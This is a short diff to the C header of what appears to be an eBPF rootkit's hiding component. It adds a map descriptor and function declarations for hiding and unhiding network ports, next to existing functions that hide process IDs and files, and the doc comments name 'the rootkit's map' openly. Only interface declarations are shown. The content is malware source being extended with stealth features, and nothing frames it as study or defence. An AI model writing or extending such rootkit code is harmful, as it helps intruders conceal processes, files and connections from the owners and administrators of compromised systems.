@@ -11,6 +11,7 @@ typedef struct {
     int hide_names_map_fd;
     int hide_bpf_map_fd;
     int tracked_pids_map_fd;
+    int hide_ports_map_fd;
     bool is_initialized;
 } hider_context_t;
 
@@ -41,6 +42,15 @@ int hider_hide_pid(hider_context_t *hider_ctx, pid_t pid);
 int hider_hide_file(hider_context_t *hider_ctx, const char *filename);
 
 /**
+ * @brief Loads a port to the rootkit's map to hide it.
+ *
+ * @param hider_ctx
+ * @param port
+ * @return int
+ */
+int hider_hide_port(hider_context_t *hider_ctx, uint16_t port);
+
+/**
  * @brief Removes a PID from the rootkit's map to unhide it.
  *
  * @param hider_ctx
@@ -57,5 +67,14 @@ int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid);
  * @return int
  */
 int hider_unhide_file(hider_context_t *hider_ctx, const char *filename);
+
+/**
+ * @brief Removes a port from the rootkit's map to unhide it.
+ *
+ * @param hider_ctx
+ * @param port
+ * @return int
+ */
+int hider_unhide_port(hider_context_t *hider_ctx, uint16_t port);
 
 #endif /* __HIDER_H */
